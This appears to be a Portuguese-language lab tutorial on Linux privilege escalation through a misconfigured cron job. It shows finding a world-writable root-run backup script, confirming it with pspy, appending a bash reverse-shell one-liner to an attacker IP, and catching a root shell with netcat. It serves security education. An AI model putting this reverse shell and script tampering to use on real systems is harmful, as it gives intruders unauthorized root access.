# Cron Jobs

Cron jobs também podem ser configurados para rodar uma única vez (por exemplo, no boot). Normalmente são usados para tarefas administrativas como backup, limpeza de diretórios etc.  
O comando `crontab` cria um arquivo de cron, executado pelo daemon `cron` no agendamento definido. Esse arquivo costuma ficar em `/var/spool/cron` para o usuário que o criou.

Cada entrada do crontab exige seis campos nesta ordem: **minutos, horas, dias, meses, semanas, comando**.  
Exemplo: `0 */12 * * * /home/admin/backup.sh` executa a cada 12 horas.

O crontab do root quase sempre só pode ser editado por root (ou por quem tem sudo completo), mas ainda pode ser abusado.  
Se existir um script gravável por todos rodando como root, mesmo sem ler o crontab você pode inferir a frequência de execução (ex.: criação de `.tar.gz` a cada X tempo). Nesse caso, basta anexar um comando ao script (como reverse shell) e ele será executado no próximo ciclo.

Algumas aplicações também criam arquivos de cron em `/etc/cron.d` e podem estar mal configuradas, permitindo edição por usuário não-root.

Primeiro, procure por arquivos/diretórios graváveis. O arquivo `backup.sh` em `/dmz-backups` parece interessante e possivelmente executado por cron.

```bash
JLMreal@htb[/htb]$ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

```text
/etc/cron.daily/backup
/dmz-backups/backup.sh
/proc
/sys/fs/cgroup/memory/init.scope/cgroup.event_control
...
/home/backupsvc/backup.sh
...
```

Ao inspecionar `/dmz-backups`, vemos arquivos criados a cada 3 minutos. Isso indica possível erro de agendamento: talvez o admin quisesse `0 */3 * * *` (a cada 3 horas), mas configurou `*/3 * * * *` (a cada 3 minutos).  
Outro problema: `backup.sh` é world-writable e roda como root.

```bash
JLMreal@htb[/htb]$ ls -la /dmz-backups/
```

```text
total 36
drwxrwxrwx  2 root root 4096 Aug 31 02:39 .
drwxr-xr-x 24 root root 4096 Aug 31 02:24 ..
-rwxrwxrwx  1 root root  230 Aug 31 02:39 backup.sh
-rw-r--r--  1 root root 3336 Aug 31 02:24 www-backup-2020831-02:24:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:27 www-backup-2020831-02:27:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:30 www-backup-2020831-02:30:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:33 www-backup-2020831-02:33:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:36 www-backup-2020831-02:36:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:39 www-backup-2020831-02:39:01.tgz
```

Podemos confirmar execução via cron com o `pspy`, ferramenta para visualizar processos em execução sem root. Ele observa o `procfs` e mostra comandos executados por outros usuários, incluindo cron.

Use:

```bash
JLMreal@htb[/htb]$ ./pspy64 -pf -i 1000
```

No output, aparecem eventos como:

```text
2020/09/04 20:46:01 CMD: UID=0    PID=2201   | /bin/bash /dmz-backups/backup.sh
2020/09/04 20:46:01 CMD: UID=0    PID=2200   | /bin/sh -c /dmz-backups/backup.sh
2020/09/04 20:46:01 CMD: UID=0    PID=2204   | tar --absolute-names --create --gzip --file=/dmz-backups/www-backup-202094-20:46:01.tgz /var/www/html
```

Isso confirma que o cron está chamando `backup.sh` como root e gerando tarball de `/var/www/html`.

Agora veja o script:

```bash
JLMreal@htb[/htb]$ cat /dmz-backups/backup.sh
```

```bash
#!/bin/bash
 SRCDIR="/var/www/html"
 DESTDIR="/dmz-backups/"
 FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
 tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
```

Como o script é gravável e executa como root, o exemplo adiciona um one-liner de reverse shell ao final:

```bash
#!/bin/bash
SRCDIR="/var/www/html"
DESTDIR="/dmz-backups/"
FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR

bash -i >& /dev/tcp/10.10.14.3/443 0>&1
```

Depois, levante listener local e aguarde. Em poucos minutos, o exemplo recebe shell root:

```bash
JLMreal@htb[/htb]$ nc -lnvp 443
```

```text
listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.2.12] 38882
...
root@NIX02:~# id
uid=0(root) gid=0(root) groups=0(root)
root@NIX02:~# hostname
NIX02
```

Embora não seja o vetor mais comum, cron jobs mal configurados ainda aparecem com frequência suficiente para merecer atenção durante enumeração.

